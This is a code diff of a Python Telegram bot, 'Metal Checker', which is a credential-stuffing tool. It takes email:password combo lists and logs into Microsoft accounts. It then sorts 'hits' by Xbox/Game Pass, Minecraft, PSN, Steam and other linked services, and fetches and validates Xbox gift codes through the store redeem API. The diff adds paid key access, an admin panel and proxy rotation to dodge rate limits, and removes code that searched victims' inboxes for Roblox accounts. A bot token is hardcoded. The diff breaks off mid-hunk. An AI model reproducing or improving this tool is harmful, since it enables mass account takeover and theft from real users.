@@ -1,9 +1,8 @@
 # ==============================================================================
-# METAL CHECKER v4.0 - THE ULTIMATE TELEGRAM BOT EDITION (INTEGRATED)
-# Coded by: @vantrexXxx
+# METAL CHECKER v5.0 - THE ULTIMATE TELEGRAM BOT EDITION (ADMIN & PROXY SYSTEM)
+# Coded by: Chester Lua
 # Supported by: Metal Drops & Icardi
-# Discord: discord.gg/cheatglobal
-# Features: Checker, Fetcher, Validator, Sorter (No HWID Limits)
+# Features: Checker, Fetcher, Validator, Sorter, Admin Panel, Auth, Force Sub
 # ==============================================================================
 
 import telebot
@@ -18,8 +17,8 @@ import sys
 import shutil
 import random
 import string
-import queue
-from datetime import datetime, timezone
+import threading
+from datetime import datetime, timedelta, timezone
 from pathlib import Path
 from threading import Lock, Thread, Event
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -30,20 +29,119 @@ from urllib.parse import quote, unquote, urlparse, parse_qs
 # GLOBAL SETTINGS, TOKENS & STATES
 # -----------------------------------------
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8812460550:AAFlrjKwwAdoGFb-DWtwt9CGF7eeQmJnKmM")
+# Owner ID olarak senin ID'n gömüldü. Başkası erişemez.
+CHAT_ID = os.environ.get("CHAT_ID", "8664147577") 
+
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
 
-# Bellek Yönetimi
 user_states = {}
 user_configs = {}
 active_tasks = {}
 stop_flags = {}
 
 # -----------------------------------------
-# 1. CORE CHECKER ENGINE (DOKUNULMADI)
+# DATABASE & AUTH SYSTEM
+# -----------------------------------------
+DB_FILE = "metal_db.json"
+db_lock = Lock()
+
+def load_db():
+    if not os.path.exists(DB_FILE):
+        return {"users": {}, "keys": {}, "admins": [], "channels": [], "proxies": []}
+    try:
+        with open(DB_FILE, "r") as f:
+            return json.load(f)
+    except:
+        return {"users": {}, "keys": {}, "admins": [], "channels": [], "proxies": []}
+
+def save_db(data):
+    with db_lock:
+        with open(DB_FILE, "w") as f:
+            json.dump(data, f, indent=4)
+
+def check_auth(user_id):
+    db = load_db()
+    if str(user_id) == str(CHAT_ID) or str(user_id) in db.get("admins", []):
+        return True
+    
+    users = db.get("users", {})
+    user_id_str = str(user_id)
+    if user_id_str in users:
+        expiry = datetime.fromisoformat(users[user_id_str])
+        if datetime.now() < expiry:
+            return True
+        else:
+            del users[user_id_str]
+            save_db(db)
+    return False
+
+def check_force_sub(user_id):
+    db = load_db()
+    channels = db.get("channels", [])
+    if str(user_id) == str(CHAT_ID): return True
+    
+    for ch in channels:
+        try:
+            member = bot.get_chat_member(ch, user_id)
+            if member.status not in ['member', 'administrator', 'creator']:
+                return False
+        except:
+            pass # Bot kanalda ekli değilse veya kanal yoksa atlar
+    return True
+
+# -----------------------------------------
+# PROXY MANAGER & CHECKER
+# -----------------------------------------
+class ProxyManager:
+    @staticmethod
+    def format_proxies(raw_proxies, p_type):
+        formatted = []
+        for p in raw_proxies:
+            p = p.strip()
+            if not p: continue
+            if "://" not in p:
+                if p_type.lower() == "socks4": p_url = f"socks4://{p}"
+                elif p_type.lower() == "socks5": p_url = f"socks5://{p}"
+                else: p_url = f"http://{p}"
+            else:
+                p_url = p
+            formatted.append(p_url)
+        return formatted
+
+    @staticmethod
+    def get_random_proxy(session):
+        db = load_db()
+        proxies = db.get("proxies", [])
+        if not proxies:
+            session.proxies = {}
+            return False
+        
+        proxy = random.choice(proxies)
+        session.proxies = {
+            "http": proxy,
+            "https": proxy
+        }
+        return True
+
+    @staticmethod
+    def check_proxy(proxy_url):
+        try:
+            s = requests.Session()
+            s.proxies = {"http": proxy_url, "https": proxy_url}
+            r = s.get("http://ip-api.com/json", timeout=5)
+            if r.status_code == 200:
+                return True
+        except:
+            pass
+        return False
+
+# -----------------------------------------
+# 1. CORE CHECKER ENGINE
 # -----------------------------------------
 class UnifiedChecker:
     def __init__(self, keywords=None, api_mode=2, check_mode="both"):
         self.session = requests.Session()
+        ProxyManager.get_random_proxy(self.session) # Check havuzda proxy varsa uygular
         self.uuid = str(uuid.uuid4())
         self.keywords = keywords if keywords else []
         self.api_mode = api_mode
@@ -110,7 +208,7 @@ class UnifiedChecker:
             sub_data = {}
             subscriptions = []
             payment_headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "User-Agent": "Mozilla/5.0",
                 "Accept": "application/json",
                 "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                 "Content-Type": "application/json",
@@ -147,62 +245,32 @@ class UnifiedChecker:
                         'Minecraft': {'type': 'MINECRAFT REALMS', 'category': 'gaming'}
                     }
                     
-                    items = []
-                    try:
-                        js = r_sub.json()
-                        if isinstance(js, list):
-                            items = js
-                        elif isinstance(js, dict):
-                            if 'value' in js and isinstance(js['value'], list):
-                                items = js['value']
-                            elif 'items' in js and isinstance(js['items'], list):
-                                items = js['items']
-                            else:
-                                items = [js]
-                    except:
-                        items = []
-                        blocks = response_text.split('}')
-                        for b in blocks:
-                            if 'title' in b or any(k in b for k in subscription_keywords):
-                                items.append(b + '}')
-                    
-                    for item in items:
-                        item_str = json.dumps(item) if isinstance(item, (dict, list)) else str(item)
-                        for keyword, info in subscription_keywords.items():
-                            if keyword in item_str:
-                                sub_info = {'name': info['type'], 'category': info['category']}
+                    for keyword, info in subscription_keywords.items():
+                        if keyword in response_text:
+                            sub_info = {'name': info['type'], 'category': info['category']}
+                            title_match = re.search(r'"title"\s*:\s*"([^"]+)"', response_text)
+                            if title_match: sub_info['title'] = title_match.group(1)
+                            
+                            renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
+                            
+                            # SABİT KISIM: active_subs.txt YAZMASINI SAĞLAYAN NET MANTIK
+                            if renewal_match:
+                                renewal_date = renewal_match.group(1)
+                                sub_info['renewal_date'] = renewal_date
+                                days_remaining = self.get_remaining_days(renewal_date + "T00:00:00Z")
+                                sub_info['days_remaining'] = days_remaining
                                 
-                                if isinstance(item, dict) and 'title' in item and item['title']:
-                                    sub_info['title'] = str(item['title'])
+                                if days_remaining != "?" and int(days_remaining) > 0:
+                                    sub_info['is_expired'] = False
                                 else:
-                                    title_match = re.search(r'"title"\s*:\s*"([^"]+)"', item_str)
-                                    if title_match: sub_info['title'] = title_match.group(1)
-                                    else: sub_info['title'] = keyword
-                                    
-                                renewal_date = None
-                                if isinstance(item, dict):
-                                    renewal_date = item.get('nextRenewalDate', item.get('renewalDate'))
-                                    if renewal_date and 'T' in renewal_date:
-                                        renewal_date = renewal_date.split('T')[0]
-                                        
-                                if not renewal_date:
-                                    renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', item_str)
-                                    if renewal_match:
-                                        renewal_date = renewal_match.group(1)
-                                        
-                                if renewal_date:
-                                    sub_info['renewal_date'] = renewal_date
-                                    days_remaining = self.get_remaining_days(renewal_date + "T00:00:00Z")
-                                    sub_info['days_remaining'] = days_remaining
-                                    if days_remaining != "?" and int(days_remaining) <= 0:
-                                        sub_info['is_expired'] = True
-                                    else:
-                                        sub_info['is_expired'] = False
-                                subscriptions.append(sub_info)
-                                break
+                                    sub_info['is_expired'] = True
+                            else:
+                                sub_info['is_expired'] = True
+                                
+                            subscriptions.append(sub_info)
                             
                     if subscriptions:
-                        active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
+                        active_subs = [s for s in subscriptions if not s.get('is_expired', True)]
                         return {"status": "PREMIUM" if active_subs else "FREE", "subscriptions": subscriptions, "data": sub_data}
             except: pass
             return {"status": "FREE", "subscriptions": [], "data": sub_data}
@@ -341,106 +409,6 @@ class UnifiedChecker:
             return {"minecraft_status": "FREE", "minecraft_username": None}
         except: return {"minecraft_status": "ERROR", "minecraft_username": None}
 
-    def GIDD(self, username):
-        url = "https://users.roblox.com/v1/usernames/users"
-        payload = {"usernames": [username], "excludeBannedUsers": False}
-        try:
-            r = requests.post(url, json=payload, timeout=10)
-            if r.status_code == 200 and r.json().get("data"):
-                return r.json()["data"][0]["id"]
-        except: pass
-        return None
-
-    def CSRFFF(self):
-        url = "https://catalog.roblox.com/v1/catalog/items/details"
-        try:
-            r = requests.post(url, json={"items":[]}, timeout=10)
-            return r.headers.get("x-csrf-token")
-        except: return None
-
-    def GSNN(self, asset_ids):
-        if not asset_ids: return []
-        token = self.CSRFFF()
-        if not token: return []
-        url = "https://catalog.roblox.com/v1/catalog/items/details"
-        items = [{"itemType": "Asset", "id": int(aid)} for aid in asset_ids]
-        headers = {"x-csrf-token": token}
-        try:
-            r = requests.post(url, json={"items": items}, headers=headers, timeout=10)
-            if r.status_code == 200:
-                return [item.get("name", "Unknown Item") for item in r.json().get("data", [])]
-        except: pass
-        return []
-
-    def ERUU(self, search_text):
-        patterns = [
-            r'account:\s*([a-zA-Z0-9_]+)',
-            r'for\s+([a-zA-Z0-9_]+)\s+and\s+want',
-            r'account:\s*([a-zA-Z0-9_]+)\.',
-            r'for\s+([a-zA-Z0-9_]+)\.\s+If'
-        ]
-        for pattern in patterns:
-            match = re.search(pattern, search_text, re.IGNORECASE)
-            if match: return match.group(1)
-        return None
-
-    def RLLL(self, username):
-        result = {"username": username, "friends": 0, "banned": "No", "created": "Unknown", "profile": "", "wearing": []}
-        user_id = self.GIDD(username)
-        if not user_id: return None
-        try:
-            user_url = f"https://users.roblox.com/v1/users/{user_id}"
-            user_res = requests.get(user_url, timeout=10)
-            user_data = user_res.json()
-            result["banned"] = "Yes" if user_data.get("isBanned", False) else "No"
-            created_raw = user_data.get("created", "")
-            result["created"] = created_raw.split("T")[0] if created_raw else "Unknown"
-            
-            friends_url = f"https://friends.roblox.com/v1/users/{user_id}/friends/count"
-            friends_res = requests.get(friends_url, timeout=10)
-            if friends_res.status_code == 200: result["friends"] = friends_res.json().get("count", 0)
-            
-            result["profile"] = f"https://www.roblox.com/users/{user_id}/profile"
-            
-            wearing_url = f"https://avatar.roblox.com/v1/users/{user_id}/currently-wearing"
-            wearing_res = requests.get(wearing_url, timeout=10)
-            if wearing_res.status_code == 200:
-                asset_ids = wearing_res.json().get("assetIds", [])
-                result["wearing"] = self.GSNN(asset_ids)
-        except: return None
-        return result
-
-    def check_roblox(self, email, access_token, cid):
-        try:
-            search_url = "https://outlook.live.com/search/api/v2/query"
-            payload = {
-                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
-                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "no-reply@roblox.com"}, "Size": 25, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
-            }
-            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
-            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
-            if r.status_code == 200:
-                data = r.json()
-                if 'EntitySets' in data and len(data['EntitySets']) > 0:
-                    entity_set = data['EntitySets'][0]
-                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
-                        result_set = entity_set['ResultSets'][0]
-                        if result_set.get('Total', 0) > 0 and 'Results' in result_set:
-                            full_text = ""
-                            for result in result_set['Results']:
-                                if 'Preview' in result:
-                                    full_text += result.get('ItemBody', {}).get('Content', result['Preview']) + " "
-                            
-                            roblox_user = self.ERUU(full_text)
-                            if roblox_user:
-                                roblox_data = self.RLLL(roblox_user)
-                                if roblox_data:
-                                    return {"roblox_status": "LINKED", "data": roblox_data}
-                                else:
-                                    return {"roblox_status": "LINKED", "data": {"username": roblox_user, "friends": 0, "banned": "Unknown", "created": "Unknown", "profile": "", "wearing": []}}
-            return {"roblox_status": "FREE", "data": {}}
-        except: return {"roblox_status": "ERROR", "data": {}}
-
     def check(self, email, password):
         try:
             url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
@@ -509,9 +477,6 @@ class UnifiedChecker:
             if self.check_mode in ["minecraft", "both"]:
                 mc_res = self.check_minecraft(email, access_token, cid)
                 result.update({"minecraft_username": mc_res.get("minecraft_username")})
-            if self.check_mode in ["roblox", "both"]:
-                rbx_res = self.check_roblox(email, access_token, cid)
-                result.update({"roblox_status": rbx_res.get("roblox_status", "FREE"), "roblox_data": rbx_res.get("data", {})})
                 
             return result
         except requests.exceptions.Timeout: return {"status": "TIMEOUT"}
@@ -530,7 +495,6 @@ class XboxCodeTools:
             '&display=touch&response_type=token&locale=en'
         )
 
-    # --- FETCH LOGIC ---
     def fetch_oauth_tokens(self, session):
         try:
             response = session.get(self.MICROSOFT_OAUTH_URL, timeout=10)
@@ -606,7 +570,6 @@ class XboxCodeTools:
             return codes
         except: return []
 
-    # --- VALIDATE LOGIC ---
     def generate_reference_id(self):
         timestamp_val = int(time.time() // 30)
         n = f'{timestamp_val:08X}'
@@ -619,26 +582,20 @@ class XboxCodeTools:
 
     def login_microsoft_account(self, email, password):
         session = requests.Session()
+        ProxyManager.get_random_proxy(session)
         session.headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'User-Agent': 'Mozilla/5.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
             'Referer': 'https://account.microsoft.com/',
             'Origin': 'https://account.microsoft.com',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-User': '?1',
             'Upgrade-Insecure-Requests': '1',
         }
         try:    
             login_response = session.post(
-                f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=1761964181&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none",
+                f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&prompt=none",
                 data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$"},
-                headers = {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    "Cookie": "MSPRequ=id=N&lt=1761964181&co=1; uaid=f8aac2614ca54994b0bb9621af361fe6; MSCC=110.226.176.161-IN; MSPOK=$uuid-28da118b-591b-4245-a835-d6a7a6516fc6; OParams=11O.DtU8h4PuH7vnv3smo7N1*styCuvoTV2MRZi8wj4oQDgi!Mpw6KZwEGt9RgLvxFZ*vwFA!0!1OLGPdeGOwX9EAmOhMaLVWgPa3!lut3b6iSqLZwZ6wKNo48s9Glp9oJNYOJ!QdDvn9Zlz6yUfmGNA71N*7RJJ82DhAEUtv9cj3S5VSLPp*rLjsZw*T!eA4rT1OoHQfj!E0MpIMb7XTGunq0W296qtBwcXcMiKnoG1DOOam7ArRr9kSeVqb2OO3gQ8tBcGfef*aveFCKUAbkdjWuhRB4vYl2RmUA5yc967445z!g761lZOAEaXxAMTGxbEibxTneHDX4PpnqWIwURKn*igMH7p7LRvIUh0TPAO2ff6h793xvhtYi3SYKj4gT6KaajxfJ3fL0Ceb*308Ner9hi32b2GVnW81LmKcQLF343cM0KcKgRXBqkPdIJ3fS*4l8wFshd1kpI0elXVUgQ9A5a4tPKO46vh9k*luyC!RSNjzNs4oQKLFF1TXRB1LifVMLwKQ3aJTxxys!YvalzEB5q6TG*bKZ1FDBjFfpSIEVdfg8XMOBszi3TGeXJw*sg5zsSVv9Efpe3UfEvAgAr24Qk*fYd2G0FdzrNpxb9nntPSX*TYsh2k5EYuW9RD6qo!qtSh8EXzTq0WS6qII0*Tkn*NxydUx3WPbZ2fiOU*ulkS8TlhUKRRbNNTMeYIWl93GOeP9cIuXtFuZ3XZimHUgv86pjFVxKXeDCVQpyOjVUSL67AuADB0ukQBYlw7z48cv0Q5XlXX4umkZErVDo5f9W4uE1mTaav!WpKqighrUL2Me5Uqexr*RCtwpDu1f5W1ay0xmPoxx*W5lIIQUmKYua93KiFQsxnma3iHtSaH2tUeClZaWauWKkBt5xwyZ3ajhyWT4Ylw8lfDgf0RNWQhdrQ6EVtXowflqyiWC71dfjUDqVnSCzTcUuZCX*Hzkewo5G3LZczEm1MeuQRPMFisXNkf3KSBgzwqlyt8rHQrNYzuZRMTyO9WGt1RS1kTDs1XNu3PG8qA1HWTq7kwHvKeVblEr!!YGoUFWaWWsQqLa0Co7x83jzWgGDTOa3NFawXQGsA5snh7HsS01WqUHgCtHT9RKRegHay9aO813K5jayLc3UR9qO2mspBZhSKuaYPOoaNUeoF5ImgWitT*g1ogFFJl12AgfmtEVWDVhzmvtR1j7oNlvEE2g0fu0SMo!NTV3zbWjxfN!F1b6UxCV0uFT7QTf8yL2M4Lw8CnCTWa5N*jc2SSZe4O2SU*2HPHn0lYFOUkGGoXTe2pHGQiW0hA8jFnufIOzjTZ0VLEA7Z6QlW62lkpDEW9OXmUdqRmp225Ag$$"
-                },
+                headers = {'Content-Type': 'application/x-www-form-urlencoded'},
                 allow_redirects=True, timeout=30
             )
             login_request = login_response.text.replace('\\', '')
@@ -731,25 +688,22 @@ class XboxCodeTools:
             token = self.get_auth_token(session, force_refresh=force_refresh_ids)
             if not token:
                 token = self.get_auth_token(session, force_refresh=True)
-                if not token: return {"status": "ERROR", "message": "Failed to get authentication token"}
+                if not token: return {"status": "ERROR", "message": "Failed to get auth token"}
             
             try:
                 headers = {
                     "host": "buynow.production.store-web.dynamics.com", "connection": "keep-alive",
-                    "x-ms-tracking-id": store_state['tracking_id'], "sec-ch-ua-platform": "\"Windows\"",
+                    "x-ms-tracking-id": store_state['tracking_id'],
                     "authorization": f"WLID1.0=t={token}", "x-ms-client-type": "AccountMicrosoftCom",
                     "x-ms-market": "US", "ms-cv": store_state['ms_cv'], "x-ms-reference-id": self.generate_reference_id(),
                     "x-ms-vector-id": store_state['vector_id'],
-                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
+                    "user-agent": "Mozilla/5.0",
                     "x-ms-correlation-id": store_state['correlation_id'], "content-type": "application/json",
-                    "x-authorization-muid": store_state['alternative_muid'], "accept": "*/*",
-                    "origin": "https://www.microsoft.com", "sec-fetch-site": "cross-site",
-                    "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://www.microsoft.com/",
-                    "accept-encoding": "gzip, deflate, br, zstd", "accept-language": "en-US,en;q=0.9"
+                    "x-authorization-muid": store_state['alternative_muid']
                 }
                 payload = {
                     "market": "US", "language": "en-US",
-                    "flights": ["sc_abandonedretry","sc_addasyncpitelemetry","sc_adddatapropertyiap","sc_addgifteeduringordercreation","sc_aemparamforimage","sc_aemrdslocale","sc_allowalipayforcheckout","sc_allowbuynowrupay","sc_allowcustompifiltering","sc_allowelo","sc_allowfincastlerewardsforsubs","sc_allowmpesapi","sc_allowparallelorderload","sc_allowpaypay","sc_allowpaypayforcheckout","sc_allowpaysafecard","sc_allowpaysafeforus","sc_allowrupay","sc_allowrupayforcheckout","sc_allowsmdmarkettobeprimarypi","sc_allowupi","sc_allowupiforbuynow","sc_allowupiforcheckout","sc_allowupiqr","sc_allowupiqrforbuynow","sc_allowupiqrforcheckout","sc_allowvenmo","sc_allowvenmoforbuynow","sc_allowvenmoforcheckout","sc_allowverve","sc_analyticsforbuynow","sc_announcementtsenabled","sc_apperrorboundarytsenabled","sc_askaparentinsufficientbalance","sc_askaparentssr","sc_askaparenttsenabled","sc_asyncpiurlupdate","sc_asyncpurchasefailure","sc_asyncpurchasefailurexboxcom","sc_authactionts","sc_autorenewalconsentnarratorfix","sc_bankchallenge","sc_bankchallengecheckout","sc_blockcsvpurchasefrombuynow","sc_blocklegacyupgrade","sc_buynowfocustrapkeydown","sc_buynowglobalpiadd","sc_buynowlistpichanges","sc_buynowprodigilegalstrings","sc_buynowuipreload","sc_buynowuiprod","sc_cartcofincastle","sc_cartrailexperimentv2","sc_cawarrantytermsv2","sc_checkoutglobalpiadd","sc_checkoutitemfontweight","sc_checkoutredeem","sc_clientdebuginfo","sc_clienttelemetryforceenabled","sc_clienttorequestorid","sc_contactpreferenceactionts","sc_contactpreferenceupdate","sc_contactpreferenceupdatexboxcom","sc_conversionblockederror","sc_copycurrentcart","sc_cpdeclinedv2","sc_culturemarketinfo","sc_cvvforredeem","sc_dapsd2challenge","sc_delayretry","sc_deliverycostactionts","sc_devicerepairpifilter","sc_digitallicenseterms","sc_disableupgradetrycheckout","sc_discountfixforfreetrial","sc_documentrefenabled","sc_eligibilityapi","sc_emptyresultcheck","sc_enablecartcreationerrorparsing","sc_enablekakaopay","sc_errorpageviewfix","sc_errorstringsts","sc_euomnibusprice","sc_expandedpurchasespinner","sc_extendpagetagtooverride","sc_fetchlivepersonfromparentwindow","sc_fincastlebuynowallowlist","sc_fincastlebuynowv2strings","sc_fincastlecalculation","sc_fincastlecallerapplicationidcheck","sc_fincastleui","sc_fingerprinttagginglazyload","sc_fixforcalculatingtax","sc_fixredeemautorenew","sc_flexibleoffers","sc_flexsubs","sc_giftingtelemetryfix","sc_giftlabelsupdate","sc_giftserversiderendering","sc_globalhidecssphonenumber","sc_greenshipping","sc_handledccemptyresponse","sc_hidegcolinefees","sc_hidesubscriptionprice","sc_highresolutionimageforredeem","sc_hipercard","sc_imagelazyload","sc_inlineshippingselectormsa","sc_inlinetempfix","sc_isnegativeoptionruleenabled","sc_isremovesubardigitalattach","sc_jarvisconsumerprofile","sc_jarvisinvalidculture","sc_klarna","sc_lineitemactionts","sc_livepersonlistener","sc_loadingspinner","sc_lowbardiscountmap","sc_mapinapppostdata","sc_marketswithmigratingcssphonenumber","sc_moraycarousel","sc_moraystyle","sc_moraystylefull","sc_narratoraddress","sc_newcheckoutselectorforxboxcom","sc_newconversionurl","sc_newflexiblepaymentsmessage","sc_newrecoprod","sc_noawaitforupdateordercall","sc_norcalifornialaw","sc_norcalifornialawlog","sc_norcalifornialawstate","sc_nornewacceptterms","sc_officescds","sc_optionalcatalogclienttype","sc_ordercheckoutfix","sc_orderpisyncdisabled","sc_orderstatusoverridemstfix","sc_outofstock","sc_passthroughculture","sc_paymentchallengets","sc_paymentoptionnotfound","sc_paymentsessioninsummarypage","sc_pidlignoreesckey","sc_pitelemetryupdates","sc_preloadpidlcontainerts","sc_productforlicenseterms","sc_productimageoptimization","sc_prominenteddchange","sc_promocode","sc_promocodecheckout","sc_purchaseblock","sc_purchaseblockerrorhandling","sc_purchasedblocked","sc_purchasedblockedby","sc_quantitycap","sc_railv2","sc_reactcheckout","sc_readytopurchasefix","sc_redeemfocusforce","sc_reloadiflineitemdiscrepancy","sc_removepaddingctalegaltext","sc_removeresellerforstoreapp","sc_resellerdetail","sc_restoregiftfieldlimits","sc_returnoospsatocart","sc_routechangemessagetoxboxcom","sc_rspv2","sc_scenariotelemetryrefactor","sc_separatedigitallicenseterms","sc_setbehaviordefaultvalue","sc_shippingallowlist","sc_showcontactsupportlink","sc_showtax","sc_skippurchaseconfirm","sc_skipselectpi","sc_splipidltresourcehelper","sc_splittaxv2","sc_staticassetsimport","sc_surveyurlv2","sc_taxamountsubjecttochange","sc_testflight","sc_twomonthslegalstringforcn","sc_updateallowedpaymentmethodstoadd","sc_updatebillinginfo","sc_updatedcontactpreferencemarkets","sc_updateformatjsx","sc_updatetosubscriptionpricev2","sc_updatewarrantycompletesurfaceproinlinelegalterm","sc_updatewarrantytermslink","sc_usefullminimaluhf","sc_usehttpsurlstrings","sc_uuid","sc_xboxcomnosapi","sc_xboxrecofix","sc_xboxredirection","sc_xdlshipbuffer"],
+                    "flights": ["sc_abandonedretry","sc_addasyncpitelemetry","sc_adddatapropertyiap","sc_addgifteeduringordercreation"],
                     "tokenIdentifierValue": code, "supportsCsvTypeTokenOnly": False, "buyNowScenario": "redeem",
                     "clientContext": {"client": "AccountMicrosoftCom", "deviceFamily": "Web"}
                 }
@@ -843,6 +797,7 @@ class XboxCodeTools:
         lines.append(f"Game categories: {len(game_groups)}")
         return "\n".join(lines) + "\n"
 
+
 # -----------------------------------------
 # RESULT MANAGER & LIVE UI
 # -----------------------------------------
@@ -854,19 +809,19 @@ class ResultManager:
         self.base_folder = f"results_{chat_id}_{timestamp}"
         Path(self.base_folder).mkdir(parents=True, exist_ok=True)
         
-        # Checker Dosyaları
         self.hits_file = os.path.join(self.base_folder, "hits.txt")
         self.two_fa_file = os.path.join(self.base_folder, "2fa.txt")
+        
+        # Tam istediğin gibi ayarlandı
         self.active_subs = os.path.join(self.base_folder, "active_subs.txt")
         self.expired_subs = os.path.join(self.base_folder, "expired_subs.txt")
+        
         self.psn_file = os.path.join(self.base_folder, "psn_hits.txt")
         self.steam_file = os.path.join(self.base_folder, "steam_hits.txt")
         self.supercell_file = os.path.join(self.base_folder, "supercell_hits.txt")
         self.tiktok_file = os.path.join(self.base_folder, "tiktok_hits.txt")
         self.minecraft_file = os.path.join(self.base_folder, "minecraft_hits.txt")
-        self.roblox_file = os.path.join(self.base_folder, "roblox_hits.txt")
         
-        # Code Manager Dosyaları
         self.fetched_codes_file = os.path.join(self.base_folder, "fetched_codes.txt")
         self.valid_codes_file = os.path.join(self.base_folder, "valid_codes.txt")
         self.invalid_codes_file = os.path.join(self.base_folder, "invalid_codes.txt")
@@ -881,8 +836,10 @@ class ResultManager:
         if self.mode in ["microsoft", "both"]:
             subs = res.get("subscriptions", [])
             if subs:
-                has_active = any(not s.get('is_expired', False) and s.get('days_remaining', '?') != '?' for s in subs)
+                # Ekranda artış olan hesapların birebir aynısı dosyaya yazılır.
+                has_active = any(not s.get('is_expired', True) for s in subs)
                 line = f"{base_str} | " + " | ".join([f"[{s.get('name', 'SUB')} - Days: {s.get('days_remaining', '?')}]" for s in subs])
+                
                 target_file = self.active_subs if has_active else self.expired_subs
                 with open(target_file, 'a', encoding='utf-8') as f: f.write(line + "\n")
                 
@@ -903,12 +860,6 @@ class ResultManager:
                 
         if self.mode in ["minecraft", "both"] and res.get("minecraft_username"):
             with open(self.minecraft_file, 'a', encoding='utf-8') as f: f.write(f"{base_str} | Username: {res['minecraft_username']}\n")
-                
-        if self.mode in ["roblox", "both"] and res.get("roblox_status") == "LINKED":
-            rbx = res.get("roblox_data", {})
-            wearing_str = ", ".join(rbx.get("wearing", []))
-            line = f"{base_str} | Username = {rbx.get('username')} | Friends = {rbx.get('friends')} | Banned = {rbx.get('banned')} | Created = {rbx.get('created')} | Profile = {rbx.get('profile')} | Wearing = [{wearing_str}]"
-            with open(self.roblox_file, 'a', encoding='utf-8') as f: f.write(line + "\n")
 
     def save_2fa(self, email, password):
         if self.mode in ["code_fetch", "code_fetch_val", "code_sort"]: return
@@ -928,18 +879,10 @@ class ResultManager:
             zip_name = f"{self.base_folder}.zip"
             shutil.make_archive(self.base_folder, 'zip', self.base_folder)
             return [zip_name], True
-        elif self.mode == "code_fetch":
-            dest = "fetched_codes.txt"
-            if os.path.exists(self.fetched_codes_file):
-                shutil.copy(self.fetched_codes_file, dest)
-                return [dest], False
-            return [], False
-        elif self.mode == "code_fetch_val":
-            dest = "valid_codes.txt"
-            if os.path.exists(self.valid_codes_file):
-                shutil.copy(self.valid_codes_file, dest)
-                return [dest], False
-            return [], False
+        elif self.mode in ["code_fetch", "code_fetch_val", "code_sort"]:
+            zip_name = f"{self.base_folder}_CODES.zip"
+            shutil.make_archive(self.base_folder, 'zip', self.base_folder)
+            return [zip_name], True
         else:
             files_to_send = []
             if self.mode == "microsoft":
@@ -950,7 +893,6 @@ class ResultManager:
             elif self.mode == "supercell" and os.path.exists(self.supercell_file): files_to_send.append(self.supercell_file)
             elif self.mode == "tiktok" and os.path.exists(self.tiktok_file): files_to_send.append(self.tiktok_file)
             elif self.mode == "minecraft" and os.path.exists(self.minecraft_file): files_to_send.append(self.minecraft_file)
-            elif self.mode == "roblox" and os.path.exists(self.roblox_file): files_to_send.append(self.roblox_file)
             
             if not files_to_send and os.path.exists(self.hits_file): files_to_send.append(self.hits_file)
             return files_to_send, False
@@ -973,7 +915,6 @@ class LiveStats:
         self.sc_hits = 0
         self.mc_hits = 0
         self.tk_hits = 0
-        self.rbx_hits = 0
         
         self.fetched_codes = 0
         self.valid_codes = 0
@@ -981,7 +922,6 @@ class LiveStats:
         
         self.latest_active_subs = deque(maxlen=3)
         self.latest_games = deque(maxlen=3)
-        self.latest_roblox = deque(maxlen=3)
         self.latest_codes = deque(maxlen=5)
         
         self.start_time = time.time()
@@ -995,11 +935,13 @@ class LiveStats:
                 self.hits += 1
                 if res:
                     subs = res.get("subscriptions", [])
-                    active_subs = [s for s in subs if not s.get('is_expired', False)]
+                    # Doğrudan eşleşme: active_subs listesi boş değilse premium = +1
